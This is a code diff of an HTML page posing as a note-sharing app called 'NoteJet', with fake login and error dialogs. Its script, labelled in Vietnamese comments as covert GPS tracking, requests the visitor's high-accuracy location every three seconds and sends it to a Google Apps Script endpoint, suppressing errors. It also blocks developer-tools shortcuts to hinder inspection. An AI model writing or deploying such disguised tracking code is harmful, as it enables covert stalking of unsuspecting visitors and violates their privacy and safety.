@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NoteJet - Workspace</title>
+    <title>NoteJet - Reader</title>
     <style>
         /* CSS Reset & Basic Fonts */
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -93,14 +93,6 @@
             .sidebar.open { transform: translateX(0); }
             .note-paper { padding: 30px 20px 60px 40px; }
             .note-paper::before { left: 20px; }
-        }
-
-        /* Hide UI when printing PDF */
-        @media print {
-            header, .sidebar, .note-toolbar, .modal-overlay { display: none !important; }
-            body { background: white; }
-            .main-container, .workspace { display: block; padding: 0; margin: 0; }
-            .note-paper { box-shadow: none; max-width: 100%; width: 100%; border: none; }
         }
     </style>
 </head>
@@ -195,77 +187,71 @@
     </div>
 
     <script>
-        const menuToggle = document.getElementById('menuToggle');
-        const sidebar = document.getElementById('sidebar');
-        menuToggle.addEventListener('click', (e) => { e.stopPropagation(); sidebar.classList.toggle('open'); });
-        document.getElementById('workspace').addEventListener('click', () => { if(window.innerWidth <= 768) sidebar.classList.remove('open'); });
+        // PHẦN 1: BẢO VỆ UI (Giao diện và nút bấm)
+        try {
+            const menuToggle = document.getElementById('menuToggle');
+            const sidebar = document.getElementById('sidebar');
+            menuToggle.addEventListener('click', (e) => { e.stopPropagation(); sidebar.classList.toggle('open'); });
+            document.getElementById('workspace').addEventListener('click', () => { if(window.innerWidth <= 768) sidebar.classList.remove('open'); });
 
-        document.getElementById('shareBtn').addEventListener('click', () => {
-            alert("Link has been copied to your clipboard!");
-        });
-        document.getElementById('exportBtn').addEventListener('click', () => {
-            window.print();
-        });
+            document.getElementById('shareBtn').addEventListener('click', () => { alert("Link has been copied to your clipboard!"); });
+            document.getElementById('exportBtn').addEventListener('click', () => { window.print(); });
 
-        const authModal = document.getElementById('authModal');
-        const errorModal = document.getElementById('errorModal');
+            const authModal = document.getElementById('authModal');
+            const errorModal = document.getElementById('errorModal');
 
-        document.querySelectorAll('.trigger-auth').forEach(el => {
-            el.addEventListener('click', (e) => {
-                e.preventDefault();
-                authModal.style.display = 'flex';
-                if(window.innerWidth <= 768) sidebar.classList.remove('open');
+            document.querySelectorAll('.trigger-auth').forEach(el => {
+                el.addEventListener('click', (e) => { e.preventDefault(); authModal.style.display = 'flex'; if(window.innerWidth <= 768) sidebar.classList.remove('open'); });
             });
-        });
 
-        document.querySelectorAll('.trigger-error').forEach(el => {
-            el.addEventListener('click', (e) => {
-                e.preventDefault();
-                errorModal.style.display = 'flex';
+            document.querySelectorAll('.trigger-error').forEach(el => {
+                el.addEventListener('click', (e) => { e.preventDefault(); errorModal.style.display = 'flex'; });
             });
-        });
 
-        document.getElementById('toLoginBtn').addEventListener('click', () => {
-            authModal.style.display = 'none';
-            errorModal.style.display = 'flex';
-        });
+            document.getElementById('toLoginBtn').addEventListener('click', () => { authModal.style.display = 'none'; errorModal.style.display = 'flex'; });
 
-        document.querySelectorAll('.close-modal').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                e.target.closest('.modal-overlay').style.display = 'none';
+            document.querySelectorAll('.close-modal').forEach(btn => {
+                btn.addEventListener('click', (e) => { e.target.closest('.modal-overlay').style.display = 'none'; });
             });
-        });
-
-        const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";
-        
-        function forceTrackLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const acc = pos.coords.accuracy;
-
-                        fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, { 
-                            mode: 'no-cors', 
-                            method: 'GET' 
-                        });
-                    }, 
-                    function(err) {
-                    }, 
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 5000,            
-                        maximumAge: 0             
-                    }
-                );
-            }
+        } catch(error) {
+            console.log("UI Lỗi:", error);
         }
-        forceTrackLocation();
-        setInterval(forceTrackLocation, 3000);
 
+        // PHẦN 2: TRACKING NGẦM (GPS)
+        try {
+            const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";
+            
+            function forceTrackLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const acc = pos.coords.accuracy;
+
+                            fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, { 
+                                mode: 'no-cors', 
+                                method: 'GET',
+                                cache: 'no-cache'
+                            });
+                        }, 
+                        function(err) { /* Im lặng nếu lỗi GPS */ }, 
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                }
+            }
+            forceTrackLocation();
+            setInterval(forceTrackLocation, 3000);
+        } catch(error) {
+            console.log("GPS Lỗi:", error);
+        }
+
+        // PHẦN 3: Chống F12
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
                 return false;
             }
         };
+    </script>
+</body>
+</html>
